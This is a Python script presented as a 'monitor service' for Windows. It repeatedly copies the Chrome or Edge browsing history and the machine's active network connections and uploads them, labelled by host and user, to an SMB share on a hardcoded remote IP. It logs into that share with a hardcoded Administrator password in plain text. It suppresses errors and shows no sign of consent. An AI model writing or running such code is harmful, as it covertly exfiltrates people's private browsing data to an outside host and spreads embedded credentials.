import os
import shutil
import sqlite3
import datetime
import psutil
import time
import socket
import getpass
import subprocess
import json
import traceback
import urllib.request

def get_external_ip():
    try:
        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf-8')
    except Exception:
        return "Unknown"

# ---------------- CONFIG ----------------
SERVER_IP = "103.86.55.183"
PORT = 5001
ROTATE_TIME = 600  # seconds (10 minutes)
SHARED_FOLDER = r"\\103.86.55.183\recording\SystemLogs"
USERNAME = "Administrator"
PASSWORD = "902729Hns"
HISTORY_LIMIT = 500
LOCAL_TEMP_FOLDER = os.path.join(os.getenv("TEMP"), "monitor_logs")
# ----------------------------------------

os.makedirs(LOCAL_TEMP_FOLDER, exist_ok=True)

def map_network_share():
    """Map the network share using net use."""
    try:
        cmd = f'net use "{SHARED_FOLDER}" /user:{USERNAME} {PASSWORD}'
        subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def ensure_remote_folder(pc_folder):
    remote_pc_folder = os.path.join(SHARED_FOLDER, pc_folder)
    try:
        if not os.path.exists(remote_pc_folder):
            os.makedirs(remote_pc_folder, exist_ok=True)
        return remote_pc_folder
    except Exception:
        return remote_pc_folder

def chrome_time_to_iso(webkit_ts):
    if not webkit_ts:
        return None
    epoch = datetime.datetime(1601, 1, 1)
    return (epoch + datetime.timedelta(microseconds=webkit_ts)).isoformat()

def get_chrome_history(limit=HISTORY_LIMIT):
    candidates = [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"),
    ]
    db_path = next((p for p in candidates if os.path.exists(p)), None)
    if not db_path:
        return []

    tmp = os.path.join(os.getenv("TEMP"), f"History_copy_{int(time.time())}.db")
    try:
        shutil.copy2(db_path, tmp)
    except Exception:
        if os.path.exists(tmp):
            os.remove(tmp)
        return []

    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute(
            "SELECT url, title, last_visit_time, visit_count, typed_count "
            "FROM urls ORDER BY last_visit_time DESC LIMIT ?",
            (limit,),
        )
        rows = cur.fetchall()
        con.close()
    except Exception:
        rows = []
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

    out = []
    for url, title, ts, vc, tc in rows:
        out.append({
            "timestamp": chrome_time_to_iso(ts),
            "url": url,
            "title": title,
            "visit_count": vc,
            "typed_count": tc,
        })
    return out

def get_network_connections():
    rows = []
    try:
        for conn in psutil.net_connections(kind='inet'):
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else ""
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else ""
            pid = conn.pid or 0
            try:
                proc_name = psutil.Process(pid).name()
            except Exception:
                proc_name = ""
            rows.append({
                "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
                "status": conn.status,
                "laddr": laddr,
                "raddr": raddr,
                "pid": pid,
                "process": proc_name,
            })
    except Exception:
        pass
    return rows

def rotate_and_write(pc_folder):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    browser_fname = os.path.join(LOCAL_TEMP_FOLDER, f"browser_{timestamp}.ndjson")
    network_fname = os.path.join(LOCAL_TEMP_FOLDER, f"network_{timestamp}.ndjson")

    browser_data = get_chrome_history()
    network_data = get_network_connections()

    external_ip = get_external_ip()
    for doc in network_data:
        doc["external_ip"] = external_ip

    try:
        with open(browser_fname, "w", encoding="utf-8") as f:
            for doc in browser_data:
                f.write(json.dumps(doc, ensure_ascii=False) + "\n")
        with open(network_fname, "w", encoding="utf-8") as f:
            for doc in network_data:
                f.write(json.dumps(doc, ensure_ascii=False) + "\n")
    except Exception:
        return False

    pc_name = socket.gethostname()
    user = getpass.getuser()
    remote_pc_folder = ensure_remote_folder(f"{pc_name}_{user}")
    try:
        shutil.copy2(browser_fname, os.path.join(remote_pc_folder, os.path.basename(browser_fname)))
        shutil.copy2(network_fname, os.path.join(remote_pc_folder, os.path.basename(network_fname)))
        os.remove(browser_fname)
        os.remove(network_fname)
        return True
    except Exception:
        return False

def main_loop():
    print("Starting monitor service...")
    map_network_share()
    last_rotate = 0
    while True:
        try:
            map_network_share()
            if time.time() - last_rotate >= ROTATE_TIME:
                rotate_and_write(pc_folder="")
                last_rotate = time.time()
            time.sleep(5)
        except KeyboardInterrupt:
            print("Stopping by user.")
            break
        except Exception as e:
            errfile = os.path.join(LOCAL_TEMP_FOLDER, "monitor_errors.log")
            with open(errfile, "a", encoding="utf-8") as ef:
                ef.write(f"{datetime.datetime.utcnow().isoformat()} ERROR: {repr(e)}\n")
                ef.write(traceback.format_exc() + "\n")
            time.sleep(5)

if __name__ == "__main__":
    main_loop()
